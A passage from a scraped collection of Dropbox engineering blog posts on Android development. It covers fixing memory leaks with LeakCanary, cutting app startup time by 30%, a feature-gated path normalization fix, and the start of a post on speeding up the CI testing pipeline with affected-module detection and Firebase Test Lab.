description.getAnnotation(SkipLeakDetection::class.java) != null ->\r\n            \"is annotated with @SkipLeakDetection\"\r\n        description.testClass.isAnnotationPresent(SkipLeakDetection::class.java) ->\r\n            \"class is annotated with @SkipLeakDetection\"\r\n        else -> null\r\n    }\r\n} Individual tests or entire test classes can use this annotation to skip leak detection. Fixing memory leaks Now that we’ve gone over various ways to find and surface memory leaks, let’s talk about how to actually understand and fix them. The leak trace provided by LeakCanary will be the single most useful tool for diagnosing a leak. Essentially, the leak trace prints out a chain of references associated with the leaked object, and provides an explanation of why it’s considered a leak. LeakCanary already has great documentation on how to read and use its leak trace, so there’s no need to repeat it here. Instead, let’s go over two categories of memory leaks that I mostly found myself dealing with. Views It’s common to see views declared as class level variables in fragments: private TextView myTextView ;  or, now that more Android code is being written in Kotlin : private lateinit var myTextView: TextView —common enough for us not to realize that these can all cause memory leaks. Unless these fields are nulled out in the fragment’s onDestroyView , (which you can’t do for a lateinit variable), the references to the views now live for the duration of the fragment’s lifecycle, and not the fragment’s view lifecycle as they should. The simplest scenario of how this causes a leak: We are on FragmentA. We navigate to FragmentB, and now FragmentA is on the back stack. FragmentA is not destroyed, but FragmentA’s view is destroyed. Any views that are tied to FragmentA’s lifecycle are now held in memory when they don’t need to be. For the most part, these leaks are small enough to not cause any performance issues or crashes. But for views that hold objects and data, images, view/data binding and the like, we are more likely to run into trouble. So when possible, avoid storing views in class-level variables, or be sure to clean them up properly in onDestroyView . Speaking of view/data binding, Android’s view binding documentation tells us exactly that: the field must be cleared to prevent leaks. Their code snippet recommends we do the following: Copy private var _binding: ResultProfileBinding? = null\r\n// This property is only valid between onCreateView and\r\n// onDestroyView.\r\nprivate val binding get() = _binding!!\r\n\r\noverride fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?\r\n): View? {\r\n    _binding = ResultProfileBinding.inflate(inflater, container, false)\r\n    val view = binding.root\r\n    return view\r\n}\r\n\r\noverride fun onDestroyView() {\r\n    super.onDestroyView()\r\n    _binding = null\r\n} This is lot of boilerplate to put in every fragment (also, avoid using !! which will throw a KotlinNullPointerException if the variable is null. Use explicit null handling instead.) We addressed this issue is by creating a ViewBindingHolder (and DataBindingHolder ) that fragments can then implement: Copy interface ViewBindingHolder<B : ViewBinding> {\r\n\r\n    var binding: B?\r\n\r\n    // Only valid between onCreateView and onDestroyView.\r\n    fun requireBinding() = checkNotNull(binding)\r\n\r\n    fun requireBinding(lambda: (B) -> Unit) {\r\n        binding?.let {\r\n            lambda(it)\r\n        }}\r\n\r\n    /**\r\n     * Make sure to use this with Fragment.viewLifecycleOwner\r\n     */\r\n    fun registerBinding(binding: B, lifecycleOwner: LifecycleOwner) {\r\n        this.binding = binding\r\n        lifecycleOwner.lifecycle.addObserver(object : DefaultLifecycleObserver {\r\n            override fun onDestroy(owner: LifecycleOwner) {\r\n                owner.lifecycle.removeObserver(this)\r\n                this@ViewBindingHolder.binding = null\r\n            }\r\n        })\r\n    }\r\n}\r\n\r\ninterface DataBindingHolder<B : ViewDataBinding> : ViewBindingHolder<B> This provides an easy and clean way for fragments to: Ensure binding is present when it’s required Only execute certain code if the binding is available Clean up binding on onDestroyView automatically Temporal leaks These are leaks that only stick around for a short duration of time. In particular, one that we ran into was caused by an EditTextView 's async task. The async task lasted just longer than LeakCanary’s default wait time, so a leak was reported even though the memory was cleaned up properly soon afterward. If you suspect you are running into a temporal leak, a good way to check is to use Android Studio’s memory profiler. Once you start a session within the profiler, take the steps to reproduce the leak, but wait for a longer period of time before dumping the heap and inspecting. The leak may be gone after the extra time. Android Studio’s memory profiler shows the effect of temporal leaks that get cleaned up. Test often, fix early We hope that with this overview, you’ll feel empowered to track down and tackle memory leaks in your own application! Like many bugs and other issues, it’s much better to test often and fix early before a bad pattern gets deeply baked into the codebase. As a developer, it’s important to remember that while memory leaks may not always affect your own app performance, users with lower-end models and lower-memory phones will appreciate the work you’ve done on their behalf. Happy leak hunting! // Tags Mobile Android Performance Application // Copy link Link copied Link copied", "date": "2021-03-23"},
{"website": "Dropbox", "title": "How we sped up Dropbox Android app startup by 30%", "author": ["Marianna Budnikova"], "link": "https://dropbox.tech/mobile/how-we-sped-up-dropbox-android-app-startup-by-30-", "abstract": "Scary climb Give me more numbers Performance offenders we found What now? Conclusion Application startup is the first thing our users experience after they install an app and then again every single time they launch it. A simple and snappy application brings users a lot more joy than an application that has a ton of features but takes an eternity to load. Realizing this, Dropbox Android team has invested in measuring, identifying, and fixing the issues that were affecting our app startup time. We ended up improving our app start time by 30%, and this is the story of how we did it. Scary climb Historically at Dropbox we have been tracking app start by measuring how long it took from the moment a user taps our app icon up until the moment the app was fully loaded and ready for user interactions. We abstracted away the measurement for app initialization in the following way: Copy perfMonitor.startScenario(AppColdLaunchScenario.INSTANCE)\r\n\r\n// perform the work needed for launching the application\r\n\r\nperfMonitor.stopScenario(AppColdLaunchScenario.INSTANCE) Being a data-driven team, we have been tracking and monitoring the app initialization with the help of graphs accessible to all engineers. The graph below shows app startup p90 measurements from late March to early April 2020. As you can see in the graph, the app startup time does not seem to be changing that much. Small fluctuations in app startup that range a couple milliseconds are expected in an application used by millions of users with variety of devices and OS versions. However, when we looked at the app startup time from December 2019 to April 2020, we saw a different picture. The app startup time has been creeping up for months as the app evolved and more features got added. However, because our charts were only showing us changes over a two week period, we missed the slow creep of app startup time that was happening over several months. While the discovery of the slowly increasing startup time was accidental, it caused us to dig deeper into the reasons why, as well as make sure that our monitoring, alerting tools, and charts were taking a broader, more cohesive look at our metrics. Give me more numbers Some features in the application can be relatively simple to measure, such as how long an API call to the server takes. While other features, such as app startup, are a lot more complicated to measure. App startup requires many different steps on the device before the main app screen is shown to the user and the application is ready for user interaction. Examining our initialization code, we identified the main events that happen during our app initialization. Here are a few of them: Run migrations Load application services Load initial users We started our investigation by leveraging the profiling tools in Android Studio to measure performance on our test phones. The problem with profiling the performance with this approach was that our test phones would not give us a statistically significant sampling of how well the app startup is actually doing. Dropbox Android application has over 1 billion installs on Google Play Store , spanning multiple types of devices, some of them old Nexus 5s, and others the newest and greatest Google devices. It would be a fool’s errand to try and profile that many configurations. So we decided to measure the different steps of app startup using scenarios and scenario steps in production. Here is the updated initialization code where we added logging for the three aforementioned steps: Copy perfMonitor.startScenario(AppColdLaunchScenario.INSTANCE)\r\nperfMonitor.startRecordStep(RunMigrationsStep.INSTANCE)\r\n\r\n// perform migrations step wrok\r\n\r\nperfMonitor.startRecordStep(LoadAppServicesStep.INSTANCE)\r\n\r\n// load application services step\r\n\r\nperfMonitor.startRecordStep(LoadInitialUsers.INSTANCE)\r\n\r\n// perform initial user loading step\r\n\r\nperfMonitor.stopScenario(AppColdLaunchScenario.INSTANCE) With the measurements instrumented in code, we were able to understand what steps in the app’s initialization were contributing the most to the app startup increase. Performance offenders we found The below graph shows the overall app startup time from January to October 2020. In May, we introduced measurements for each of the major steps that happen during application initialization. These measurements allowed us to identify and address the largest offenders to the performance of the app startup. The major app startup offenders included Firebase Performance library initialization, feature flag migration, and initial user loading. Firebase Performance Library Firebase Performance library is included in Google’s Firebase suite of products to measure and send metrics about the performance of the apps. It provides helpful functionality such as metrics for individual method performance as well as infrastructure to monitor and visualize the performance of different parts of the app. Unfortunately, Firebase Performance library also comes with some hidden costs. Among them are an expensive initialization process and as a result a significant increase in the build times. In our debugging, we discovered that Firebase suite initialization was seven times longer when Firebase Performance tool was enabled. To fix the performance issue, we chose to remove the Firebase Performance tool from the Android Dropbox application. Firebase Performance library is a wonderful tool that allows you to profile very low level performance details such as individual function calls, but since we have not been using these features, we decided that fast app startup outweighed the individual method performance data, and so we removed the reference to that library. Migrations There are several internal migrations that run each time the Dropbox application is launched. These can include updating feature flags, database migrations, etc. Unfortunately, we found that some of these migrations were running at every app launch. We didn’t notice the bad performance of these migrations previously, because the application launched quickly on development and test devices. Unfortunately, this migration code performed especially poorly on older versions of the OS and older devices, contributing to increased startup time. To resolve the issue, we began by investigating which migrations were essential on every launch and which migrations could now be removed entirely from the app. We found and removed at least one migration that was very old and therefore no longer needed, helping get our app start time back on track. User loading In the legacy part of our application, we store Dropbox user contacts metadata on the device as JSON blobs. In an ideal world, those JSON blobs should be read and converted into Java objects only once. Unfortunately, the code to extract users was getting called multiple times from different legacy features of the app, and each time, the code would perform expensive JSON parsing to convert user JSON blobs into Java objects. Storing user contacts as JSON was a very outdated design and a part of our monolith legacy code. To get an immediate fix for this issue, we added functionality to cache the parsed user objects during initialization. As we continue working on breaking down the monolith legacy code, a more efficient and modern solution for user contact storage would be to use Room database objects and convert those objects to business entities. What now? As a result of removing reference to Firebase Performance, removing expensive migration steps, and caching user loading, we improved the app launch performance of the Dropbox Android application by 30%. Through this work, we have also put together dashboards that will help prevent degradation of the app startup time in the future. We also adopted several practices that will hopefully prevent us from making the same performance mistakes. Here are a couple of them: Measure app startup performance impact when adding third party libraries With the discovery of how much Firebase Performance library degraded our app startup, we introduced a process for adding third party libraries. Today, we require measuring the application startup time, build time and the APK size of the application before the library can be added and used in our codebase. Cache all the things Since two of the major offenders to the app startup performance had to do with caching, we prefer to cache expensive computations even if it does make the code a bit more complicated. After all, a better user experience is worth a little extra maintenance. Conclusion With more investments into credible analytics and performance measuring, we have become a lot more data-driven as a team which allows us to make larger investments into our code base, such as deprecating legacy C++ code , with a lot more confidence. Today, we monitor several dashboards that that provide us insights on performance of the most critical parts of our applications, and have processes in place to ensure that Dropbox applications continue to be snappy and a delight to our users. Thanks to Amanda Adams, Angella Derington, Anthony Kosner, Chris Mitchell, David Chang, Eyal Guthmann, Israel Ferrer Camacho, and Mike Nakhimovich for comments and review. // Tags Mobile Android Performance // Copy link Link copied Link copied", "date": "2021-02-09"},
{"website": "Dropbox", "title": "Our counterintuitive fix for Android path normalization", "author": ["Gary Guo"], "link": "https://dropbox.tech/mobile/our-counterintuitive-fix-for-android-path-normalization", "abstract": "How did this happen? Finding the Best Solution Problems Solved What we learned Since its inception, the Dropbox Android app has had challenges sharing files and folders with special names. These problems ranged from being unable to see folders with Cyrillic characters to crashing when attempting to load content within certain paths. The root cause of the problem was easy to identify, as we’ll explain, but the obvious fix was far too risky to attempt. Instead, by going against conventional wisdom, we devised and carried out a plan that was both low-risk and low-cost. How did this happen? Historically, Dropbox has used normalized paths to uniquely identify files and folders. Normalized paths are file or folder paths that have been converted to a standard form that’s operating-system agnostic. For example, we would normalize the path /Documents /CAT.jpg as /documents/cat.jpg . Getting rid of uppercase letters, spaces, tab characters, and other little things, lets the file names and paths work on both an Android phone and an Apple tablet, as well as any Windows desktop. But paths must be normalized in a precise way, and this normalization logic must be replicated perfectly on all platforms. If it’s not done properly, miscommunication between a server and client can occur during file/folder operations. That results in show-stopping bugs for the user and their files. The choices we had initially made for a simple normalization solution on Dropbox servers turned out to be tricky to implement correctly on other platforms. The Dropbox Android client, in particular, ended up with its path normalization logic implemented incorrectly. In hindsight, two decisions led us into the situation. Steps taken by the server to normalize a path Decision #1: Removal of spaces We had chosen to strip away space characters from the ends of folder names, but we retained other whitespace characters (e.g. tab characters). This would later conflict with Android’s normalization of the same paths. Decision #2: Python 2.5 vs Cyrillic Our second decision had been made unintentionally. When we first developed Dropbox servers for our 2007 debut, our engineers used the most stable version of Python at the time: Python 2.5. The server therefore used Python 2.5’s unicode.lower() function in its path normalization logic. Unfortunately, Python in those days had poor internationalization support, plus its lowercase function was flawed. It did not take the context into account—the Greek character sigma (Σ) can have a different lowercase form depending on where it is used (σ or ς). And in some cases, Python 2.5 was outright missing the lowercase mapping for certain characters. The lowercase form of the Cyrillic character Uk ( Ꙋ ) is ꙋ , but Python 2.5 returns Ꙋ . Python 2.5 was ported over from the original Dropbox code to maintain backward compatibility. That’s why its lowercasing behavior, a relic of 2006, is still running on our servers. How Path Normalization on Android went wrong Dropbox’s original path normalization implementation for Android did not account for these two quirks in the server’s implementation. First of all, Android removes all leading and trailing white space characters from folder names. This may strip away characters that our server does not. For instance, the server considers a folder name consisting of a single tab character to be correctly normalized. When the Android client normalizes this same path, it will delete the character since a tab is a whitespace character. This results in a folder with no name, which breaks the file path. Second, Android uses Java’s lowercase function to normalize paths. Java’s lowercase function has support for more characters than Python 2.5’s lowercase function, and it also considers context. This results in mismatches over the lowercased form of certain paths between the Android client and the server. For example, consider a folder named with three Sigma characters: ΣΣΣ . The Android client would lowercase ΣΣΣ as σσς . This is because the lowercase of Σ is σ in the middle of a word, but it is ς at the end of the word. The server, however, would lowercase ΣΣΣ as σσσ . This disagreement over the normalized path of a folder results in user-breaking bugs, such as folders not being displayed in the app. How a string is lowercased. Python 2.5 vs Java The impact Path normalization is a low-level function used widely in the Dropbox app. Problems within that logic may cause bugs to appear in a wide range of places. We couldn’t accurately estimate the extent of the problem’s impact on users, but clearly it made Dropbox behave mysteriously for more than a few of them. Finding the Best Solution There was an obvious fix to the problem: Change the way the path is normalized on Android to match the server’s imperfect methods. But this approach would run into a serious problem of its own. Path normalization covers a broad code surface: It spans at least 12 source code files for the Android app, with nearly 100 locations where normalization functions are called. It is used in many crucial file operations such as upload, move, and delete. If a new bug were to be introduced within this logic, it could result in loss of user data for users who weren’t already at risk to the existing bugs. That risk was flat-out unacceptable. How could we de-risk the fix? We saw two sensible ways. Unfortunately, neither of these theoretically elegant solutions would work well in practice. Option 1: Ditch paths, switch to an ID-based file system Using paths to uniquely identify files and folders has a lot of built-in drawbacks, of which the incompatible path formats across platforms is only one. A system that uses unique IDs rather than file and folder paths would make these problems go away. This is actually the direction that Dropbox is heading anyway. The biggest downside is the amount of work required. The use of Dropbox paths as a unique identifier in the app is deeply rooted. It would take multiple engineers several months. Due to the engineering cost, it would be difficult to prioritize this option, even though Dropbox would eventually get it done. In fact, this solution was proposed back in 2016 but has yet to be prioritized at the time of writing. Just as important from a user perspective, this big a change would also introduce risks for all users. It’s a major change not to be rushed into. Option 2: Use feature-gating to roll out a fix Dropbox has an in-house system called Stormcrow that lets us roll out changes to our apps on any platform in a way that lets us turn off a feature change immediately if there’s a problem, without needing to build, test, and ship another update to the app to back it out. But Stormcrow doesn’t get initialized early enough in the app’s runtime to gate this particular fix. The Dropbox app contains many components we call managers, for example the FavoritesManager which keeps track of the user’s favorite files and folders on their device, rather than needing to connect to a server every time from, in this case, their Android device. Many of these managers need to store Dropbox paths in a local disk cache (the “disk” these days is often solid-state memory). On app startup, these managers reload paths from disk, which requires our path normalization logic. During this time, Stormcrow is unavailable due to its dependencies on some of those very files being reloaded. So we can’t use Stormcrow to turn changes in path normalization code on and off. There are ways around this problem, but this solution has its own issues. The Stormcrow interactor is the keeper of all feature gate states. So the path normalization logic would need access to the Stormcrow interactor in order for the normalization logic to be gated. We could, in an obvious and elegant solution, pass the Stormcrow interactor as an argument to the path normalization logic. Brilliant, right? Wrong. From a simple search we could see that there were at least 100 call sites in our production code where paths are normalized, and over 600 call sites in the unit tests we run before we even think about shipping production code. We would need to change code in over 700 places—and this assumes the Stormcrow interactor code would be accessible in all the many places necessary to reach into its data structures. Besides the volume of work required, the risk of changing a constructor used in 800 places is, once again, much higher than we’d want to take. The solution is not impossible. It is just too costly and complicated. The whole idea of Stormcrow is to reduce engineering work and user risk in making changes, not increase it. Option 3: A global static variable. Seriously. Using a Stormcrow was actually the best idea, but the implementation was much too complex. We needed to simplify it. First, let’s restate the problem in a simpler way: we need access to a state (a Stormcrow gate) in multiple places without needing major refactors. If we take a step back and prioritize a working product over software engineering elegance, a trivial solution emerges that lets us go with Stormcrow: Use a global static variable. Bear with me. A global static variable checks both critical boxes: It can be accessed at app launch. It can be accessed everywhere. The only drawback is the general negativity associated with global static variables by software engineers, for good reasons: Too much scope. Global variables can be accessed anywhere; they can be modified anywhere. This can make code hard to reason about. Difficult to test. Static variables can maintain state between unit tests, making unit tests also hard to reason about. Although these drawbacks seem pretty terrible, they’re only applicable when the global static variable is used as a long-term solution. In this case, we only want to use a global static variable while gating our fix in case it has its own problems. As soon as we’re sure that our fix works reliably without new risks, we can remove the global static variable from the code completely. Problems Solved Checking gate state at app launch Although the global static variable gives the path normalization logic access to the gate state, it only solves half of the problem. The gate’s state still needs to be made available at app launch. The solution to this problem was found, again, by simplifying the problem to its most basic form: We need a value before we can compute it. In this case, we can use the last computed value. Specifically, we can cache the state of the gate once the Stormcrow interactor is ready, then use it during the next app launch. The full solution is as follows: When the app first launches, check if we have a cached value of the state of the gate on disk. If we do, read it and set the global static variable accordingly. If we don’t, default to use the old path normalization logic. Once the Stormcrow interactor is initialized, register a listener on it and cache the state of the gate on disk. Conditionally use our modified path normalization code via Stormcrow, based on the state of the global static variable. Modified app launch lifecycle See how that works? In this specific case with customers’ data at risk, a global static variable made our code much, much simpler and much less risky to them than redesigning file storage or adding code that sticks its fingers into Stormcrow. Once we’d stepped back to look at the situation in a larger perspective, our short-lived global static variable would let us take the best long-term path: Roll out the obvious, simplest fix in a way that could be instantly redacted. Avoid major refactoring to Stormcrow code to handle one short-lived code change. And take the time we need to build better, ID-based file management wisely. Global static variables are almost never the right solution. Almost. In this case, solving our Android customers’ crashes quickly and safely—for them as well as us—was worth the inevitable comments and tweets we’ll get about omg a global static. Building and Testing Implementing the fix was straightforward. The majority of our work was gathering information to prove the proposed gating solution would work. Research was vigorous, due to the risks. The key behavior to verify was that toggling the feature gate on and off did not cause any issues with Dropbox paths that were persisted to disk. To verify this, we ran an audit for every data source that contained a Dropbox path. We found that all but one data source already took into account the unreliability of Dropbox paths stored on the client. The exception was the metadata database, which stores a cached version of a user’s entire file system. Our solution was to clear the metadata database each time the state of the gate changed, a solution proven effective in past projects. Besides the audits, analytic events were added to track cases where the new and old path normalization logic disagreed. For privacy reasons the event could only report if an inconsistency had been detected, without specifying the actual path and file names involved. The new path normalization was fully unit tested. We also organized a small bug bash, in which no major bugs were found. Launch After the release build with the fix inside had shipped to 100% of customers, we rolled out a test run of the new path normalization logic. The test run did not change any logic; instead whenever a path was normalized using the old code it would also normalize the path using the new logic. The two normalized paths were then compared and the result was logged. The path normalized using the new logic was then discarded. During the test run, we measured the rate at which any pathname inconsistencies were reported. Either too high, or 0.0%, would indicate a problem with our new code. It hovered around 0.1%, which seemed reasonable since we did not expect a large number of folders with Cyrillic names. Once we were satisfied with the results of the test run, we slowly rolled out the fix across our user base via the Stormcrow feature gate, and monitored analytics. During the roll out crashes revolving around empty folder names fell to zero. This heavily implied that the fix was a success. Further confirming it, we didn’t received any new customer support tickets related to the fix. After waiting long enough to trust we had succeeded, we removed all of the gating logic. Farewell, global static variable. Our first and most obvious fix from the start of this story was now live in our customers’ apps. What we learned Any engineer will nod in agreement at three lessons we took away from the project. But you haven’t really learned them until you’ve gotten over yourself and applied them to a challenging project. When facing time pressure and resource constraints, it can be tough to recall: Keep things simple Challenge what you believe General guidelines are general The use of a global static variable was critical for this fix. It kept everything simple. It goes against general guidelines, but that’s the point of this story: General guidelines by definition have exceptions. Often when we learn, we create mental shortcuts. We simplify. For instance, let’s say we try a new approach X, but quickly learn that X was the wrong choice. We might generalize and think X is bad, period, when the truth is that X was bad given the situation. Even in cases where we recognized this, over time we can forget the situation while ingraining the generalization. These generalizations can be helpful. They allow us to quickly rule out bad solutions, rather than repeat them, and help us focus on identifying good ones. But these generalizations don’t always work. Occasionally they rule out a good solution. When faced with a difficult problem, it might be valuable to stop and look for which your own assumptions could be challenged. The time and effort you stand to save scales with the complexity of the solution. Ask yourself: Is there something far simpler that I’ve told myself isn’t an option? Maybe it’s the best option of all. // Tags Mobile Android // Copy link Link copied Link copied", "date": "2020-10-27"},
{"website": "Dropbox", "title": "Revamping the Android testing pipeline at Dropbox", "author": ["Will Clausen"], "link": "https://dropbox.tech/mobile/revamping-the-android-testing-pipeline-at-dropbox", "abstract": "Step 1: Recognize the problem Step 2: Examine the existing tech setup Step 3: Selectively scale the pipeline Always: Evaluate opportunity costs Midpoint evaluation Takeaways—and source code At Dropbox, we are proud to have recently hit one billion downloads on what is still our original Android app. Historically, we have been a relatively small team of about a dozen engineers. Recently, though, our org has grown to more than 60 mobile engineers. This growth led to an explosion of features (great!) as well as an explosion of execution time for our testing pipeline (not so great). As the org grew, the time it took to run our automated suite of unit tests went from 30 to 75 minutes. What started as the effort of a handful of engineers had increased to 400 modules and 900,000 lines of code. Maintaining a high bar of quality with this much code requires a continuous investment in testing. This year, we spun up a Mobile Foundation team and let them loose on our mobile testing infrastructure. We want to share how we scaled our CI pipeline , which is built on top of an in-house task runner called Changes to better serve the 3x growth of new engineers, new features and of course, new tests. Using industry standard tools, some code borrowed from AndroidX, and lots of Kotlin, we reduced our CI runtime from an average of 75 minutes to 25 minutes. We did this by learning a lot about Gradle , offloading work to Firebase Test Lab , and rearchitecting our CI jobs to better allow parallelism. Step 1: Recognize the problem The growing team and codebase exposed some pain points in our development infrastructure. One of our biggest came from our testing pipeline which was run on every update to our diffs (i.e. pull requests). Our Android app has a suite of over 6,000 unit tests to ensure we can continually make improvements and update the app without any regressions. We run some of these unit tests off-device (i.e. in a JVM) while others run on emulators. The long CI cycle was compounded by how we calculated code coverage. We want to make sure that coverage does not drop when writing new code. We were using a custom Python toolchain to validate the coverage level of each file in the codebase. Unfortunately, the custom tooling suffered from occasional flakiness and a persistent lack of flexibility. The combination of this flakiness with long-running checks was extremely frustrating, and a significant productivity killer. Save developers from developing bad habits One of the wonderful things about Dropbox engineers is that they will go to great lengths to avoid frustration and wasted time. Unfortunately, when it came to our time-consuming CI, this trait led our engineers into development anti-patterns . Rather than many small diffs, folks were making a few large ones. Engineers sometimes ended up writing less automated tests for new code, due to a fear of flakes causing delays for hours. This meant that we had a higher reliance on manual QA than we wanted. An example was engineers adding coverage exceptions of 0% early to files which then grew, untested, over time. These exceptions told our tooling to not validate test coverage on those files. Individually, these decisions were great for engineers who wanted to ship a small piece of code as quickly as possible. But they were less than great for the overall org, and for the long-term health of the codebase. It’s important to recognize that the root cause of these issues was the bad developer experience of waiting for CI to finish running. It was halting their work unnecessarily too often. Investing in a better developer experience was well worth the time and focus they would get back. (At Dropbox, we believe focus is the new productivity .) Our plan to reduce both CI flakiness and execution time revolved around a few goals: Test what is needed—no more no less Migrate to industry standard tools Parallelize Android unit tests that we run on device Step 2: Examine the existing tech setup The Dropbox Android app is built using Gradle and has about 400 modules stored in a Git monorepo.  We have one module which is referred to as the monolith and has about 200,000 lines of code along with 2,200 unit tests. The remainder of the modules are very small by comparison, and mostly contain SDKs or new features. Prior to our overhaul, we ran every test in the codebase on every pull request (PR) from an engineer. The process worked like this: When a developer sends a PR, a job in our CI infrastructure is created—a virtual machine begins executing various tasks. This virtual machine will set up the environment, use Gradle to build the app APK , assemble and run the unit tests, then launch an emulator and run the Android Tests. All our JVM tests , along with on-device unit tests produced coverage data. Once all tests are finished, custom scripts read and combine that execution data to produce an overall report for the project. When the report is generated, the job is complete and the PR is updated with the results. Our existing setup had its fair share of custom tooling. For example, on CI we had previously made a decision to merge the source sets of our various modules into a single module/APK. This isn’t standard, but was done to make device tests execute more quickly.  By creating a mega test module we only needed to compile one rather than dozens of test APKs. This was a savings of roughly 15 minutes on every CI run. But as is often the case with custom tooling, it had tradeoffs. It led to a suboptimal experience for developers, where tests could succeed locally but then fail in CI. A common example: An engineer would forget to add a dependency to the app module when adding it to a library module. Our handling of code coverage was another example of using custom infrastructure that involved tradeoffs. We used the industry standard tool Jacoco to measure code coverage, but had custom Python code for verifying coverage above a threshold. We wanted coverage reported on a per-file level, and allow for tests anywhere in the codebase to contribute to coverage for a given file, which was in a custom toolchain Calculating coverage this way had the advantage of increasing overall coverage in our codebase. However, it led to a number of edge cases in our code which occasionally resulted in flakes in our CI process. It also allowed engineers to write tests in one module to improve coverage in another, an anti-pattern for module encapsulation. As a result, reusing modules in a new app would result in a drop in coverage for the new app. Step 3: Selectively scale the pipeline Running all of the tests on every PR was a simple way to guarantee the safety of a given change to the codebase. The downside was it took lots of time. Logically, you don’t actually need to run every test for every change to get the full safety of automated tests. You only need to run tests for code that changed, or that could have been affected by the change. To visualize this, consider the following example module diagram for an application. If code changes in the :networking module, what tests should be run to ensure everything still works? Of course, you would need to execute the tests inside the :networking module. What is a little less intuitive, but absolutely vital, is that you would need to also run the tests in :featureA. This is because :featureA might expect the :networking module to behave a certain way. The changes could violate those expectations and break :featureA. So, when one module directly depends on another (e.g. :featureA directly depends on :networking), you must run the dependent module’s tests whenever the base module changes. Next, it’s important to realize modules that implicitly depend on :networking might also break from this change. Think a Markov Blanket . The reasoning is the same as for explicit dependencies, but is worth elaborating. Consider the impact of changes to the :networking module on the :app module. As we established above, it is possible that the change in the :networking module will change the behavior of the :featureA module. If :app was relying on :featureA to behave a certain way, and the change in the :networking module changes the way :featureA behaves, :app could break. This is how a change in the :networking module could end up breaking the :app module. Ideally the code is not so tightly coupled that this situation would happen frequently, but it’s important to recognize that this is always a possibility. When a base module changes, anything that depends on the module, explicitly or implicitly, could break. Thus, we need to run the tests for :networking, :featureA, and :app whenever the :networking module is changed. Now that we understand what tests must be run when a base module changes, we can see clearly what tests do not need to be run. In the example, tests for the :utils and :featureB modules do not need to be run when the :networking module changes. Those modules are not dependent, either explicitly or implicitly, on the behavior of the :networking module. They don’t even know the :networking module exists. The key to saving time when running tests in CI is to not run the :featureB and :utils tests when an engineer updates the :networking module. When you have 5 modules, as in the example, the savings are likely small. But when you have 400 modules, you can really save time by figuring out what tests are needed and only running those tests, especially for product engineers who rarely make changes in base or util modules. Smaller test cycles increases developer confidence by allowing iterative changes in the same time that 1 large change used to be tested for. To realize those time savings, we needed to: Find a way to determine what modules needed to be tested from the file changes in an engineer’s diff Construct a graph of the dependencies between modules Identify, for a given change, which modules were affected. This is a non-trivial programming task, given the format of the input data and available APIs. Initially we thought we would need to make drastic changes, such as changing CI systems or abandoning Gradle for Bazel , which would have been a multi-year effort. After spending months evaluating Bazel we came to the conclusion that we do not have the resources to abandon the plethora of tools and community support that Gradle has. As always in these situations, it would have been nice if someone else had already solved this problem and could help us out. Fortunately, in the world of Android development, there is a robust open-source community. AndroidX is one of the most prominent examples of open source repositories to improve Android development. Late last year, we were lucky enough to grab a few minutes with Yigit Boyar , an engineer on the AndroidX team, who shared with us how his team solved this problem while still using the Gradle build system. We were doubly lucky. Not only did Yigit share his theoretical knowledge of this problem, he actually pointed us to the implementation used by the AndroidX team, which is open source! He got us to explore a part of AndroidX that we had never before thought to use before: the code that actually builds and tests AndroidX, particularly its novel approach to testing through an Affected Module Detector . If AndroidX can succeed using Gradle we were confident we can scale with it as well. While this code was coupled to how AndroidX does revisions through gerrit , it nonetheless gave us a fantastic starting point for our own solution (Spoiler alert: We’ve open-sourced it . )  We were able to migrate some helper classes to instead be dependent only on Git, and begin testing Git’s ability to determine what modules are changed when a given file is updated in our codebase. In our initial pass on JVM unit tests, we saw fantastic results from the Affected Module Detector. We used it to disable any JVM test task which didn’t need to run for a given change. Copy project.tasks.withType(Test::class.java) { task ->\r\n                task.onlyIf {\r\n                    affectedModuleDetector.shouldInclude(task.project)\r\n                }\r\n            } This was promising progress, and an aha moment of clarity that helped us pick up a general pattern of writing Gradle configuration code in Kotlin , which increases their testability. However, this alone was not enough for a production-ready solution. A module with only disabled tasks still consumes a small amount of time to process—in our experience, about 500ms to 750ms. When multiplied by 400 modules, build profilers, and loggers, even a no-op run could take several minutes to bypass our unit tests. Don’t exclude tasks, include dependencies instead To prevent this unnecessary churning, we turned around our approach. Instead of excluding unnecessary tasks, we create a task which only includes necessary dependencies. Many Gradle tutorials later, we settled on the following, again all in Kotlin: Copy private fun registerRunAffectedUnitTests(rootProject: Project, affectedModuleDetector: AffectedModuleDetector) {\r\n        val paths = LinkedHashSet<String>()\r\n        rootProject.subprojects { subproject ->\r\n            val pathName = \"${subproject.path}:testUnitTest\"\r\n            if (affectedModuleDetector.shouldInclude(subproject) && \r\n                subproject.tasks.findByPath(pathName) != null) {\r\n                paths.add(pathName)\r\n            }\r\n        }\r\n        rootProject.tasks.register(\"runAffectedUnitTests\") { task ->\r\n            paths.forEach { path ->\r\n                task.dependsOn(path)\r\n            }\r\n            task.onlyIf { paths.isNotEmpty() }\r\n        }\r\n    } This gave us hope that we were on the right track and could soon try to apply this same algorithm to our on-device Android tests. We have released these tasks as part of our version of the affected module plugin . Run Android Tests in the Cloud Our previous implementation ran our Android tests on a series of emulators hosted in-house which were spun up using custom tooling written in Python. This had served us well, but it presented limitations in sharding the tests across multiple emulators, prevented us from testing on physical devices, and required upkeep on our part. We evaluated a few options for hosting physical devices: Managed devices in house Google’s Firebase Test Lab Amazon’s Device Farm We ultimately chose Google’s Firebase Test Lab because we wanted to be able to share knowledge with other companies our size, and because of the incredible availability of Firebase Test Lab support engineers on the Firebase community on S lack . Using the same strategy as we had with unit tests, we rewrote our testing scripts to instead leverage Gradle and Android Plugin APIs by registering a task which only depends on modules which include Android tests.  This task will call assembleAndroidTests and generate all of the appropriate Android Test APKs. While this approach increases the number of APKs we generate, in turn increasing our overall build time, it achieves our goal of allowing us to test each module in isolation. Developers can now write more targeted tests and apply coverage in a more focused way. It also allows us to more safely use modules across multiple apps. From there, we’ve incorporated Fladle into our Gradle scripts.  This allows us to write a simple Domain Specific Language (DSL) and scale our individual Android Tests across multiple Firebase Test Lab Matrixes, sharding suites of tests where appropriate. Reviewing our source code, most modules have fewer than 50 Android tests and run in under 30 seconds.  However, our monolith still has hundreds of tests which take a few minutes to complete. Fortunately, Flank allows us to easily shard the tests and split them across multiple devices to run in parallel, reducing time drastically. In a scenario where we run all of our tests from all of our modules, we will start 26 matrices, with up to 3 shards in the monolith’s matrix. Each matrix runs tests for a maximum of 2 minutes. Including the time to upload APKs, allocate devices, run the tests, and process the results, this step takes 7 minutes (Firebase only charges for the 2 minutes of runtime). Due to Flank and Firebase Test Lab’s abilities to scale with our modules and to shard tests within an 